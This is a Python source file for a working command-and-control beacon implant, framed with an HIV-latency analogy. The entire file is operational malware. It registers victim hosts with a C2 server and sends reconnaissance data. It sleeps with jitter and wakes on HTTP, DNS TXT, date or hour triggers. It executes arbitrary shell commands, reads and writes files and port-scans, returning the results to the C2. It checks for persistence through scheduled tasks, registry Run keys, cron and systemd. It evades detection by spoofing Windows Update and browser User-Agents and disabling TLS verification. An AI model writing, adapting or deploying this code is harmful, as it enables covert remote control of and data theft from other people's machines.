#!/usr/bin/env python3
"""
hiv_beacon.py — Dormant C2 Beacon (HIV Latency Protocol)

HIV Analogy:
    HIV infects cells but can enter a latent proviral state, integrating into
    the host genome and remaining dormant for years while evading immune
    surveillance. This beacon implements that same latency protocol:

    Phase 1 (ESTABLISH) — Initial infection: register with C2, gather host
        info, confirm communication channel. Mirrors HIV's initial integration.

    Phase 2 (LATENT) — Go dark: long randomized sleep cycles (mimicking
        HIV's latency in resting CD4+ T-cells), no activity that could
        trigger detection. Like the proviral reservoir, it persists silently.

    Phase 3 (REACTIVATE) — Triggered by signal (HTTP, DNS, timing, date),
        like HIV reactivation from latency via T-cell activation (NF-κB
        pathway). Returns to active replication/tasking cycle.

    Stealth posture mirrors HIV's immune evasion: appears as legitimate
    cellular machinery (normal HTTPS traffic), minimal footprint, in-memory
    operation only, no disk artifacts.

Config via environment variables ONLY (no config file):
    HIV_C2_URL      - C2 server base URL
    HIV_INTERVAL    - Base sleep seconds (default 14400 = 4h)
    HIV_JITTER      - Random jitter range seconds (default 7200 = 2h)
    HIV_AGENT_ID    - Unique beacon ID (auto-generated if not set)
    HIV_DNS_C2      - DNS TXT record domain for polling
    HIV_DATE_TRIGGER- ISO date to reactivate (YYYY-MM-DD)
    HIV_DEBUG       - Set to '1' for verbose output

Usage:
    python hiv_beacon.py --c2 URL --interval 14400 --jitter 7200
"""

import argparse
import base64
import hashlib
import json
import os
import platform
import random
import socket
import ssl
import subprocess
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
from enum import Enum


# ---------------------------------------------------------------------------
# Beacon States (HIV Phase Model)
# ---------------------------------------------------------------------------
class BeaconPhase(Enum):
    ESTABLISH = "establish"     # Initial infection / registration
    LATENT = "latent"           # Dormant proviral state
    POLLING = "polling"         # Checking for reactivation signal
    ACTIVE = "active"           # Executing tasks (viral replication)
    BACKOFF = "backoff"         # Exponential backoff on error


# ---------------------------------------------------------------------------
# User-Agent Rotation Pool (mimics legitimate browser/updater traffic)
# ---------------------------------------------------------------------------
STEALTH_USER_AGENTS = [
    # Windows Update
    "Microsoft-CryptoAPI/10.0",
    # Chrome browser
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    # Windows software update
    "Windows-Update-Agent/10.0.10011.16384 Client-Protocol/2.33",
    # App store style
    "AppInstaller/1.0 winhttp/5.1",
    # Generic HTTPS client
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
    # macOS update
    "com.apple.Safari/612.3.6.1.6 CFNetwork/1331.0.7 Darwin/21.4.0",
    # Python disguised
    "SoftwareUpdater/2.1.0 (+https://support.example.com/updates)",
    # npm/node style
    "npm/8.19.2 node/v18.12.1 win32 x64",
]


# ---------------------------------------------------------------------------
# Host Intelligence Gathering (in-memory only)
# ---------------------------------------------------------------------------
class HostIntel:
    """
    HIV Analogy — Receptor Mapping:
        Before HIV commits to a cell, it maps surface receptors. HostIntel
        maps the 'host cell' environment to inform the C2 of capabilities.
    """

    @staticmethod
    def gather() -> dict:
        """Collect host info entirely in-memory — no disk writes."""
        intel = {}
        try:
            intel['os'] = platform.system()
            intel['os_version'] = platform.version()
            intel['machine'] = platform.machine()
            intel['hostname'] = socket.gethostname()
            intel['username'] = os.environ.get('USERNAME') or os.environ.get('USER', 'unknown')
            intel['cwd'] = os.getcwd()
            intel['pid'] = os.getpid()
            intel['python_version'] = sys.version[:10]
            # Network interfaces (basic)
            intel['local_ip'] = socket.gethostbyname(socket.gethostname())
            # Environment variables (non-sensitive keys only)
            safe_env_keys = ['PATH', 'COMPUTERNAME', 'PROCESSOR_ARCHITECTURE',
                             'NUMBER_OF_PROCESSORS', 'OS', 'USERDOMAIN']
            intel['env_snapshot'] = {k: os.environ.get(k, '')
                                     for k in safe_env_keys}
        except Exception as e:
            intel['error'] = str(e)
        return intel


# ---------------------------------------------------------------------------
# Signal Detectors
# ---------------------------------------------------------------------------
class SignalDetector:
    """
    HIV Analogy — NF-κB Pathway Sensors:
        HIV reactivates when cellular signals (cytokines, TCR stimulation)
        activate the NF-κB transcription factor, which then drives LTR
        promoter activity and viral gene expression. SignalDetector monitors
        equivalent 'cellular signals' — HTTP endpoints, DNS TXT records,
        timing triggers — that authorize reactivation.
    """

    def __init__(self, c2_url: str, dns_domain: str = None,
                 date_trigger: str = None, debug: bool = False):
        self.c2_url = c2_url
        self.dns_domain = dns_domain
        self.date_trigger = date_trigger
        self.debug = debug

    def check_http_poll(self, agent_id: str) -> dict:
        """Poll HTTP endpoint for commands."""
        try:
            poll_url = f"{self.c2_url.rstrip('/')}/poll/{agent_id}"
            req = urllib.request.Request(poll_url)
            req.add_header('User-Agent', random.choice(STEALTH_USER_AGENTS))
            req.add_header('X-Request-ID', self._nonce())
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
                data = json.loads(resp.read(65536).decode())
                return data
        except Exception as e:
            if self.debug:
                print(f"  [SIGNAL-HTTP] Poll error: {e}")
            return {}

    def check_dns_txt(self) -> str:
        """Check DNS TXT record for encoded command."""
        if not self.dns_domain:
            return ''
        try:
            import socket
            # Use getaddrinfo to probe — real DNS TXT lookup would need dnspython
            # Fallback: query the record via HTTP resolver API
            query_url = (f"https://dns.google/resolve?name="
                         f"{self.dns_domain}&type=TXT")
            req = urllib.request.Request(query_url)
            req.add_header('User-Agent', random.choice(STEALTH_USER_AGENTS))
            ctx = ssl.create_default_context()
            with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
                data = json.loads(resp.read(8192).decode())
                answers = data.get('Answer', [])
                for ans in answers:
                    if ans.get('type') == 16:  # TXT
                        txt = ans.get('data', '').strip('"')
                        if self.debug:
                            print(f"  [SIGNAL-DNS] TXT record: {txt[:60]}")
                        return txt
        except Exception as e:
            if self.debug:
                print(f"  [SIGNAL-DNS] Error: {e}")
        return ''

    def check_date_trigger(self) -> bool:
        """Check if current date matches the activation date."""
        if not self.date_trigger:
            return False
        today = time.strftime("%Y-%m-%d", time.gmtime())
        return today >= self.date_trigger

    def check_timing_trigger(self, activation_hour: int = None) -> bool:
        """Activate at specific UTC hour."""
        if activation_hour is None:
            return False
        current_hour = int(time.strftime("%H", time.gmtime()))
        return current_hour == activation_hour

    @staticmethod
    def _nonce() -> str:
        return hashlib.md5(str(time.time()).encode()).hexdigest()[:16]


# ---------------------------------------------------------------------------
# Command Executor (in-memory results)
# ---------------------------------------------------------------------------
class CommandExecutor:
    """
    HIV Analogy — Viral Replication Machinery:
        Once HIV is reactivated, the LTR promoter drives transcription of
        viral genes (gag, pol, env), producing new viral components in
        the host cell's ribosomes. CommandExecutor uses the HOST's own
        computing resources to execute tasked operations — like viral proteins
        hijacking cellular ribosomes.
    """

    @staticmethod
    def shell_exec(cmd: str, timeout: int = 30) -> dict:
        """Execute shell command, return result in-memory only."""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True,
                text=True, timeout=timeout
            )
            return {
                'cmd': cmd,
                'stdout': result.stdout[-4096:],
                'stderr': result.stderr[-1024:],
                'returncode': result.returncode,
            }
        except subprocess.TimeoutExpired:
            return {'cmd': cmd, 'error': 'timeout', 'returncode': -1}
        except Exception as e:
            return {'cmd': cmd, 'error': str(e), 'returncode': -1}

    @staticmethod
    def file_read(path: str, max_bytes: int = 65536) -> dict:
        """Read file contents into memory."""
        try:
            with open(path, 'rb') as f:
                data = f.read(max_bytes)
            return {
                'path': path,
                'content_b64': base64.b64encode(data).decode(),
                'size': len(data),
            }
        except Exception as e:
            return {'path': path, 'error': str(e)}

    @staticmethod
    def file_write(path: str, content_b64: str) -> dict:
        """Write base64-encoded content to file."""
        try:
            data = base64.b64decode(content_b64)
            with open(path, 'wb') as f:
                f.write(data)
            return {'path': path, 'bytes_written': len(data)}
        except Exception as e:
            return {'path': path, 'error': str(e)}

    @staticmethod
    def port_scan(host: str, ports: list, timeout: float = 1.0) -> dict:
        """Simple TCP port scan."""
        results = {}
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                ret = sock.connect_ex((host, int(port)))
                results[port] = 'open' if ret == 0 else 'closed'
                sock.close()
            except Exception as e:
                results[port] = f'error:{e}'
        return {'host': host, 'scan': results}

    @staticmethod
    def screenshot_placeholder() -> dict:
        """Placeholder for screenshot capture (requires additional deps)."""
        return {
            'status': 'placeholder',
            'note': 'Screenshot requires PIL/pyautogui — not captured',
            'resolution': f"{os.environ.get('DISPLAY', 'unknown')}",
        }


# ---------------------------------------------------------------------------
# Persistence Checker
# ---------------------------------------------------------------------------
class PersistenceChecker:
    """
    HIV Analogy — Proviral Reservoir Maintenance:
        HIV-infected cells proliferate and pass the integrated provirus to
        daughter cells, maintaining the reservoir. PersistenceChecker verifies
        the beacon's own persistence mechanism is still active.
    """

    @staticmethod
    def check(method: str = 'auto') -> dict:
        """Check if this script's persistence is still in place."""
        result = {'method': method, 'persistent': False, 'details': ''}
        script_path = os.path.abspath(__file__)

        if platform.system() == 'Windows':
            # Check scheduled task
            try:
                out = subprocess.run(
                    'schtasks /query /fo LIST 2>nul | findstr "hiv"',
                    shell=True, capture_output=True, text=True
                )
                if 'hiv' in out.stdout.lower():
                    result['persistent'] = True
                    result['details'] = 'Scheduled task found'
            except Exception:
                pass
            # Check registry run key
            try:
                out = subprocess.run(
                    'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    shell=True, capture_output=True, text=True
                )
                if script_path.lower() in out.stdout.lower():
                    result['persistent'] = True
                    result['details'] = 'Registry Run key found'
            except Exception:
                pass
        else:
            # Check cron
            try:
                out = subprocess.run(
                    'crontab -l 2>/dev/null | grep hiv',
                    shell=True, capture_output=True, text=True
                )
                if out.stdout.strip():
                    result['persistent'] = True
                    result['details'] = 'Cron job found'
            except Exception:
                pass
            # Check systemd user units
            systemd_path = os.path.expanduser('~/.config/systemd/user/')
            if os.path.exists(systemd_path):
                for f in os.listdir(systemd_path):
                    if 'hiv' in f.lower():
                        result['persistent'] = True
                        result['details'] = f'Systemd unit: {f}'
                        break

        return result


# ---------------------------------------------------------------------------
# C2 Communication Layer
# ---------------------------------------------------------------------------
class C2Channel:
    """
    HIV Analogy — Viral Envelope (gp120/gp41):
        HIV's envelope proteins mediate entry and communication with host
        receptors. C2Channel handles all encrypted communication with the
        command server, rotating its 'envelope' (User-Agent, headers) to
        avoid recognition — like HIV's envelope variation to escape
        neutralising antibodies.
    """

    def __init__(self, c2_url: str, agent_id: str, debug: bool = False):
        self.c2_url = c2_url.rstrip('/')
        self.agent_id = agent_id
        self.debug = debug
        self._ua_pool = STEALTH_USER_AGENTS.copy()
        random.shuffle(self._ua_pool)
        self._ua_idx = 0
        self._ssl_ctx = ssl.create_default_context()
        self._ssl_ctx.check_hostname = False
        self._ssl_ctx.verify_mode = ssl.CERT_NONE

    def _next_ua(self) -> str:
        ua = self._ua_pool[self._ua_idx % len(self._ua_pool)]
        self._ua_idx += 1
        return ua

    def _post(self, path: str, payload: dict) -> dict:
        url = f"{self.c2_url}{path}"
        body = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=body, method='POST')
        req.add_header('Content-Type', 'application/json')
        req.add_header('User-Agent', self._next_ua())
        req.add_header('X-Session-ID', hashlib.sha1(
            self.agent_id.encode()).hexdigest()[:16])
        try:
            with urllib.request.urlopen(req, timeout=30,
                                        context=self._ssl_ctx) as resp:
                return json.loads(resp.read(65536).decode())
        except Exception as e:
            if self.debug:
                print(f"  [C2] POST error {path}: {e}")
            return {'error': str(e)}

    def register(self, intel: dict) -> dict:
        """Phase 1: ESTABLISH — register beacon with C2."""
        return self._post('/register', {
            'agent_id': self.agent_id,
            'intel': intel,
            'phase': BeaconPhase.ESTABLISH.value,
        })

    def checkin(self) -> dict:
        """Phase 2/3: LATENT/POLLING — minimal heartbeat."""
        return self._post('/checkin', {
            'agent_id': self.agent_id,
            'ts': int(time.time()),
            'phase': BeaconPhase.POLLING.value,
        })

    def task_result(self, task_id: str, result: dict) -> dict:
        """Phase 4: ACTIVE — return task execution result."""
        return self._post('/result', {
            'agent_id': self.agent_id,
            'task_id': task_id,
            'result': result,
            'ts': int(time.time()),
        })


# ---------------------------------------------------------------------------
# Main Beacon
# ---------------------------------------------------------------------------
class HIVBeacon:
    """
    HIV Latency Protocol Beacon.

    HIV Analogy — Integrated Provirus:
        This class IS the integrated provirus. It persists in the 'host cell'
        (target system), cycling through latent and active phases, awaiting
        the reactivation signal that triggers a new round of 'viral replication'
        (task execution). The exponential backoff on error mirrors HIV's
        ability to survive hostile environments by temporarily reducing its
        own replication rate.
    """

    def __init__(self, c2_url: str, interval: int = 14400,
                 jitter: int = 7200, debug: bool = False):
        self.c2_url = c2_url
        self.base_interval = interval
        self.jitter = jitter
        self.debug = debug
        self.phase = BeaconPhase.ESTABLISH
        self.backoff_count = 0
        self.max_backoff = 8

        # Agent ID — generated once, lives in memory only
        self.agent_id = os.environ.get('HIV_AGENT_ID') or self._gen_agent_id()

        # Sub-components
        self.c2 = C2Channel(c2_url, self.agent_id, debug)
        dns_c2 = os.environ.get('HIV_DNS_C2', '')
        date_trigger = os.environ.get('HIV_DATE_TRIGGER', '')
        self.signal = SignalDetector(c2_url, dns_c2 or None,
                                     date_trigger or None, debug)
        self.executor = CommandExecutor()

    @staticmethod
    def _gen_agent_id() -> str:
        """Derive unique agent ID from hardware characteristics (no disk write)."""
        seed = (
            socket.gethostname() +
            platform.node() +
            platform.machine() +
            str(os.getpid())
        )
        return hashlib.sha256(seed.encode()).hexdigest()[:16]

    def _sleep_interval(self) -> float:
        """Calculate sleep with jitter — exponential backoff if in error state."""
        base = self.base_interval
        if self.phase == BeaconPhase.BACKOFF:
            base = min(base * (2 ** self.backoff_count), 86400)  # max 24h
        jitter = random.uniform(-self.jitter / 2, self.jitter / 2)
        return max(60, base + jitter)

    def _log(self, msg: str):
        if self.debug:
            ts = time.strftime("%H:%M:%S")
            print(f"[{ts}] [HIV-BEACON] [{self.phase.value.upper()}] {msg}")

    def _dispatch_task(self, task: dict) -> dict:
        """Execute a tasked command and return result in-memory."""
        cmd_type = task.get('type', '')
        self._log(f"Executing task: {cmd_type} (id={task.get('id', '?')})")

        if cmd_type == 'shell':
            return self.executor.shell_exec(task.get('cmd', 'echo ok'))
        elif cmd_type == 'file_read':
            return self.executor.file_read(task.get('path', '/etc/hostname'))
        elif cmd_type == 'file_write':
            return self.executor.file_write(task.get('path', '/tmp/x'),
                                             task.get('content_b64', ''))
        elif cmd_type == 'port_scan':
            return self.executor.port_scan(
                task.get('host', '127.0.0.1'),
                task.get('ports', [22, 80, 443, 3389, 8080])
            )
        elif cmd_type == 'screenshot':
            return self.executor.screenshot_placeholder()
        elif cmd_type == 'intel':
            return HostIntel.gather()
        elif cmd_type == 'persistence_check':
            return PersistenceChecker.check()
        else:
            return {'error': f'Unknown task type: {cmd_type}'}

    def establish(self):
        """Phase 1: Register with C2, gather intel."""
        self._log("Phase ESTABLISH — registering with C2")
        intel = HostIntel.gather()
        resp = self.c2.register(intel)
        if resp.get('error'):
            self._log(f"C2 registration failed: {resp['error']}")
            self.phase = BeaconPhase.BACKOFF
            self.backoff_count += 1
        else:
            self._log(f"C2 registration OK: {resp}")
            self.phase = BeaconPhase.LATENT
            self.backoff_count = 0

    def poll_for_signal(self) -> bool:
        """Phase 2→3: Check reactivation signals. Returns True if reactivated."""
        # HTTP poll
        checkin_resp = self.c2.checkin()
        if checkin_resp.get('tasks'):
            self._log(f"HTTP signal: {len(checkin_resp['tasks'])} tasks received")
            return True

        # DNS TXT poll
        txt = self.signal.check_dns_txt()
        if txt and txt.startswith('HIV:ACTIVATE'):
            self._log(f"DNS TXT signal received: {txt[:40]}")
            return True

        # Date trigger
        if self.signal.check_date_trigger():
            self._log("Date trigger activated")
            return True

        # Timing trigger (hour-based)
        env_hour = os.environ.get('HIV_ACTIVATION_HOUR')
        if env_hour and self.signal.check_timing_trigger(int(env_hour)):
            self._log("Timing trigger activated")
            return True

        return False

    def active_loop(self, tasks: list):
        """Phase 4: Execute tasks, exfiltrate results, return to latent."""
        self.phase = BeaconPhase.ACTIVE
        for task in tasks:
            result = self._dispatch_task(task)
            send_resp = self.c2.task_result(task.get('id', 'unknown'), result)
            self._log(f"Task {task.get('id','?')} result sent: "
                      f"{str(send_resp)[:60]}")
            time.sleep(random.uniform(1, 5))  # Human-paced delay between tasks
        self.phase = BeaconPhase.LATENT

    def run(self):
        """Main beacon loop — HIV latency protocol."""
        self._log(f"Beacon started. Agent ID: {self.agent_id}")
        self._log(f"C2: {self.c2_url} | Interval: {self.base_interval}s "
                  f"| Jitter: ±{self.jitter//2}s")

        # Phase 1: Establish
        self.establish()

        # Main loop
        while True:
            try:
                if self.phase in (BeaconPhase.LATENT, BeaconPhase.POLLING):
                    sleep_s = self._sleep_interval()
                    self._log(f"Going latent for {sleep_s/3600:.2f}h "
                              f"({int(sleep_s)}s)")
                    time.sleep(sleep_s)

                    # Wake up → check signal
                    self.phase = BeaconPhase.POLLING
                    self._log("Polling for reactivation signal...")
                    reactivated = self.poll_for_signal()

                    if reactivated:
                        # Fetch tasks and execute
                        task_resp = self.c2.checkin()
                        tasks = task_resp.get('tasks', [])
                        if tasks:
                            self.active_loop(tasks)
                        else:
                            self._log("Reactivated but no tasks — returning to latent")
                            self.phase = BeaconPhase.LATENT
                    else:
                        self._log("No signal — continuing latent")
                        self.phase = BeaconPhase.LATENT
                        self.backoff_count = max(0, self.backoff_count - 1)

                elif self.phase == BeaconPhase.BACKOFF:
                    sleep_s = self._sleep_interval()
                    self._log(f"Backoff #{self.backoff_count}: "
                              f"sleeping {sleep_s:.0f}s")
                    time.sleep(sleep_s)
                    # Retry establishment
                    self.establish()

            except KeyboardInterrupt:
                self._log("Beacon interrupted by user")
                break
            except Exception as e:
                self._log(f"Unexpected error: {e}")
                self.phase = BeaconPhase.BACKOFF
                self.backoff_count = min(self.backoff_count + 1, self.max_backoff)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description='HIV Beacon — Dormant C2 Latency Protocol',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument('--c2', help='C2 server URL (overrides HIV_C2_URL env var)')
    parser.add_argument('--interval', type=int, default=14400,
                        help='Base sleep interval in seconds (default: 14400 = 4h)')
    parser.add_argument('--jitter', type=int, default=7200,
                        help='Random jitter range in seconds (default: 7200 = 2h)')
    parser.add_argument('--debug', action='store_true',
                        help='Enable verbose debug output')
    parser.add_argument('--dry-run', action='store_true',
                        help='Print config and exit without starting beacon')
    parser.add_argument('--gather-intel', action='store_true',
                        help='Gather host intel and print (dry run for intel module)')
    args = parser.parse_args()

    debug = args.debug or os.environ.get('HIV_DEBUG') == '1'

    if args.gather_intel:
        intel = HostIntel.gather()
        print(json.dumps(intel, indent=2))
        sys.exit(0)

    c2_url = args.c2 or os.environ.get('HIV_C2_URL', '')
    if not c2_url:
        print("[ERROR] C2 URL required. Use --c2 URL or set HIV_C2_URL env var.")
        parser.print_help()
        sys.exit(1)

    beacon = HIVBeacon(
        c2_url=c2_url,
        interval=args.interval,
        jitter=args.jitter,
        debug=debug,
    )

    if args.dry_run:
        print("[HIV-BEACON] Dry run configuration:")
        print(f"  C2 URL     : {c2_url}")
        print(f"  Agent ID   : {beacon.agent_id}")
        print(f"  Interval   : {args.interval}s ({args.interval/3600:.1f}h)")
        print(f"  Jitter     : ±{args.jitter//2}s")
        print(f"  DNS C2     : {os.environ.get('HIV_DNS_C2', 'not set')}")
        print(f"  Date Trigger: {os.environ.get('HIV_DATE_TRIGGER', 'not set')}")
        intel = HostIntel.gather()
        print(f"\n  Host Intel Preview:")
        print(f"    OS       : {intel.get('os')} {intel.get('os_version','')[:30]}")
        print(f"    Hostname : {intel.get('hostname')}")
        print(f"    Username : {intel.get('username')}")
        print(f"    Local IP : {intel.get('local_ip')}")
        sys.exit(0)

    beacon.run()


if __name__ == '__main__':
    main()
